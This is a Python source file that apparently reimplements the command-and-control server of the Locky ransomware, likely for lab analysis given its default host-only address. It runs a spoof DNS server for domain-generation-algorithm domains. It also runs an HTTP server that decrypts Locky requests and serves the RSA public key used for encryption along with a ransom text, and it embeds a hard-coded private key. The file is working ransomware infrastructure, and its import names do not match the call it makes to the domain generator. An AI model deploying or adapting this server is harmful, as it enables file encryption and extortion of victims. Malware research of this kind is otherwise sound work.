#!/usr/bin/python3.6

#
# C&C Reimplementation to Locky ransomware
# Author: Adrien Coueron
#

import datetime, argparse, subprocess, os, time, socket, threading, base64
import dgaV2, dns, lockyHTTPRequestCipher, lockyHTTPResponseCipher

class CacRequestHandlerThread(threading.Thread):
	def __init__(self, ip, port, clientsocket):
		threading.Thread.__init__(self)
		self.ip = ip
		self.port = port
		self.clientsocket = clientsocket
		self.publicKey = b'\x06\x02\x00\x00\x00\x24\x00\x00\x52\x53\x41\x31\x00\x08\x00\x00\x01\x00\x01\x00\x3D\xCE\xB5\x2E\x3D\xE5\xCD\xCB\x53\xB1\xA4\x66\xC8\x8E\x7C\x31\x39\xD9\xAD\x8B\xDC\xF3\x87\x25\x5C\xB0\x6C\xA1\x4D\x40\xB7\xA4\xC5\xE8\x20\x22\x90\x99\x8D\x99\x31\x43\xEF\xF9\x3A\x82\xA1\x9A\x1A\x64\x94\xBF\xAF\x6D\xDA\x49\xC1\x69\x20\x7C\xEE\xF5\xFB\xD8\x9E\xCB\x1B\xDE\xE9\xF5\x84\xC6\xAF\xAA\xC8\xE3\xED\x68\x70\x0B\x35\xB3\xA3\xAE\xC6\x62\xD6\xDA\x8A\xEC\x68\x6B\x8B\x7A\x7E\xA9\x17\x67\x3C\xE1\xCF\x87\x58\xFD\x21\xBE\x7E\xCA\x08\xAD\x06\x91\x92\x4E\xBD\x9A\xDA\xA9\xC4\x37\x85\x34\x77\x35\x9C\x43\xE8\xE7\x7F\x4C\x28\x31\x7B\xF2\x03\x3F\x96\x33\x3D\x94\x9A\xDA\x8E\x8B\x55\x46\x33\xA3\xD4\xCD\x08\x70\x97\x41\x21\xBC\x49\x1A\xE4\xA3\xD4\xB5\x53\x60\x4A\x94\x4E\x00\x20\x3C\x33\x72\xA8\xE1\x5C\x96\xE5\x20\xCE\x19\x16\x74\x15\x5D\xF1\xD3\xAF\xF4\x71\x14\xC7\x51\xD9\x55\x6E\x86\x92\x8F\x27\x94\x62\x43\x2B\x91\xCE\x60\xCD\xBC\x8F\xDF\xE0\x1C\x24\xB1\xB2\x76\x89\x57\x67\x20\x02\xE9\xC5\xBE\x19\x07\xC3\xB3\x74\xF1\x16\x51\x2B\xCB\xDA\x09\x9E\xDA\x71\xC5\xC7\x62\x6F\xFE\x79\x54\x8E\x19\x3C\xC2\x57\xFF\x55\xE4\x29\xAB'
		self.privateKey = b'MIIBOAIBAAJAYlHVsh4EEz0StbeINyZaq6px8lyinl8diZFGNUu9gATpSa9CJ84D5VL9FmV7pmiGspciMxS9OA9XA4NSqVvpDwIDAQABAkBZFTS+MhwXIlr1ctlkvsegisq7gduGC0BECPDIEVwdxTXrmMcWhM/cWjqdzy5P1zXQ/GDVUO1E3J38xhFJhjFhAiEAnxh4Pvhm00VR/MCJBYs5rPrfIS8cM0Dm7xPT6hzPWC0CIQCeNKti7oLXJ1UkuM3wzr9JSoPLwY2k5OwAkIcdkfLvqwIgO3fZEqilPtmNgO2zChh1kZwgpXXHk7zx1XHS55KnSm0CIB51E127f1L+joTAU1194BOzFcZ/X86UB99f87M8quF7AiAl9bpkX7obyU9qTZmSTzkLDLEmkWAE2M6mjEObIzvRJw=='
		self.text = 'Chiffrement effectu√©'
		self.httpSeparator = b'\r\n\r\n'

	def run(self): 
		#try:
		req = self.clientsocket.recv(2048)
		headers = self.parseHeadersParams(req)
		plaintextBody = self.getPlaintextBody(req)
		requestParams = self.parseRequestParam(plaintextBody)
		print(requestParams)
		if(requestParams['act'] == b'getkey'):
			response = self.createResponseGetkey(headers, requestParams)
			print('Get pubkey request')
			self.clientsocket.send(response)
		elif(requestParams['act'] == b'gettext'):
			print('Get text request')
			response = self.createResponseGettext(headers, requestParams)
			self.clientsocket.send(response)
		elif(requestParams['act'] == b'stat'):
			print('Stat')
		#except:
		#	print("Except: Packet malformed")

	def createResponseGettext(self, headers, requestParams):
		responseBody = lockyHTTPResponseCipher.encrypt(self.text.encode('utf-8'))
		httpHeaders = self.createHTTPHeaderResponse(headers, len(responseBody))
		return httpHeaders + responseBody + b'\r\n\r\n'

	def createResponseGetkey(self, headers, requestParams):
		responseBody = lockyHTTPResponseCipher.encrypt(self.publicKey)
		httpHeaders = self.createHTTPHeaderResponse(headers, len(responseBody))
		return httpHeaders + responseBody + b'\r\n\r\n'
	
	def createHTTPHeaderResponse(self, requestHeaders, bodyLength):
		responseHeader = '{} 200 OK\r\n'.format(requestHeaders['protocol'])
		responseHeader += 'Content-Length: {}\r\n\r\n'.format(bodyLength)
		return responseHeader.encode('utf-8')
		
	def parseHeadersParams(self, req):
		header = req[:req.find(self.httpSeparator)]
		params = {}
		headersList = header.split(b'\r\n')
		firstLine = headersList[0]
		del headersList[0]
		for el in map(lambda x: x.split(b': '), headersList):
			params[el[0].decode('utf-8')] = el[1]
		params['method'], params['ressource'], params['protocol'] = firstLine.split(b' ')
		return params

	def parseRequestParam(self, body):
		params = {}
		for el in map(lambda x: x.split(b'='), body.split(b'&')):
			params[el[0].decode('utf-8')] = el[1].replace(b'+', b' ')
		return params

	def getPlaintextBody(self, req):
		body = req[req.find(self.httpSeparator)+len(self.httpSeparator):]
		return lockyHTTPRequestCipher.decrypt(body)

class DNSThread(threading.Thread):
	def __init__(self, domainsList, hostIP):
		threading.Thread.__init__(self)
		self.domainsList = domainsList
		self.hostIP = hostIP

	def run(self): 
		dns.startDNS(domainsList, hostIP)

def startDNS(domainsList, hostIP):
	DNSThread(domainsList, hostIP).start()

def startCaC():
	#try:
	serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serverSocket.bind(('', 80))
	while True:
		serverSocket.listen(10)
		clientSocket, (ip, port) = serverSocket.accept()
		requestHandler = CacRequestHandlerThread(ip, port, clientSocket)
		requestHandler.start()
	#except:
	#	print("Except: Start C&C")
	#	serverSocket.close()


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-H", "--host",
	  help="Host IP")
	parser.add_argument("-c", "--config",
	  help="DGA's configuration")
	args = parser.parse_args()

	if args.host:
		hostIP = args.host
	else:
		hostIP = '192.168.56.1'

	if args.config:
		configDGA = args.config
	else:
		configDGA = 7

	date = datetime.datetime.now()
	day = date.day
	month = date.month
	year = date.year
	

	domainsList = dga.dga(day, month, year)
	print(str(domainsList))
	startDNS(domainsList, hostIP)
	startCaC()
